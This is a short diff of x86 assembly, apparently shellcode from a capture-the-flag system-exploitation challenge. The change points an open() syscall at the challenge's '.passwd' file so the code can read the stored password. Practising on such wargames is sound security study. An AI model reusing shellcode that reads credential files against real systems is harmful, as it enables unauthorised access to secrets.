@@ -50,7 +50,7 @@ nop
 ; save eax (output buffer ptr)
 mov edx, eax
 
-; open(".passwd", O_RDONLY = 0)
+; open("/challenge/app-systeme/ch32/.passwd", O_RDONLY = 0)
 ; eax=5, ebx="...", ecx=0
 push 5
 pop eax ; open
